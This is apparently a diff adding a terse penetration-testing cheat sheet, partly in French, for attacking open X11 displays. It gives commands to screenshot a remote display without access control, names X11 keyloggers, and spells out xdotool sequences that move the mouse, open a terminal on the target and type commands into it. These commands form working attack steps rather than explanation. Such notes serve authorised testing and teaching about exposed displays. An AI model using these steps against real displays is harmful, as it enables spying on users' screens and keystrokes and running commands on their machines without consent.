@@ -1,0 +1,25 @@
+# x11
+
+# simple test
+$ DISPLAY=targethost:0 xlsfonts/xrandr/xev
+
+# screenshot
+  - xwd/xwud
+faire des screenshots qd pas de controle d'acces:
+$ xwd -display x.x.x.x:0 -root > fic.xwd
+  - vncsnapshot
+
+# keylogging
+xmacrorec2
+xspy
+
+# inject keycodes
+xwininfo -root -children / for i in $(xdotool search '.') ; do xdotool getwindowname $i ; done
+; making sure mouse will be top left when openbox menu opens, then right click to spawn it and click on the Terminal entry (first entry by default on ubuntu)
+xdotool mousemove 50 50; sleep 1; xdotool click --window 232 3; sleep 1; xdotool mousemove_relative --sync 45 10; sleep 1; xdotool click 1 
+; bring mouse over window (window may need to be moved to +0+0 beforehand with xdotool windowmove 0xabcd), and type commands
+xdotool mousemove 110 160; sleep 1; xdotool key Return; sleep 1; xdotool type clear; sleep 1; xdotool key Return or xdotool type $'\nclear\ntouch /tmp/woot\n' # ^L + ^U didnt work with roxterm
+
+# fake key generation
+http://op-co.de/blog/posts/hacking_the_nx300/
+http://bharathisubramanian.wordpress.com/2010/03/14/x11-fake-key-event-generation-using-xtest-ext/
